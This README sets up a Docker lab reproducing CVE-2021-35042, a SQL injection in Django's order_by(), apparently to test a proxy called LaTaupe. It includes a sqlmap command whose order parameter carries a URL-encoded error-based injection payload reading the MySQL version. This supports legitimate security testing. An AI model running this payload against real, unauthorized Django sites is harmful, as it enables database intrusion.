# CVE-2021-35042 lab

This fixture reproduces
[CVE-2021-35042](https://www.djangoproject.com/weblog/2021/jul/01/security-releases/),
an SQL injection in `QuerySet.order_by()` affecting Django versions before
3.2.5 and 3.1.13. User-controlled ordering text could be interpreted as SQL
when it reached an expected column position.

The fixture is adapted from
[Vulhub](https://github.com/vulhub/vulhub/tree/master/django/CVE-2021-35042).
It runs Django 3.2.4 and MySQL in containers. Compose performs the migrations
and loads the sample records automatically.

## Network

The vulnerable service joins a frontend network and a private backend network.
MySQL joins only the backend. The only host binding is
`127.0.0.1:3000`, so neither service is exposed to the LAN.

## Start

```bash
docker compose up -d
docker compose ps
```

## Run LaTaupe from source

From the LaTaupe repository root:

```bash
LATAUPE_UPSTREAM_HTTP=http://127.0.0.1:3000 \
LATAUPE_PROXY_PORT=8081 \
PYTHONPATH=src python -m app.main
```

This runs LaTaupe directly from `src`. Nuitka is not involved. In another
terminal, run SQLMap only against LaTaupe:

```bash
sqlmap -u 'http://127.0.0.1:8081/vuln/?order=vuln_collection.name%29%3Bselect%20updatexml%281%2Cconcat%280x7e%2C%28select%20%40%40version%29%29%2C1%29%23' \
  --batch --dbms=MySQL --level=1 --risk=1 --flush-session
```

The attack does not use a Python script or an attacker container. Port `8081`
is the LaTaupe proxy; Django remains its upstream on port `3000`.

Stop the isolated environment with:

```bash
docker compose down --volumes
```

Only run the payload against this local fixture or systems you are explicitly
authorized to assess.
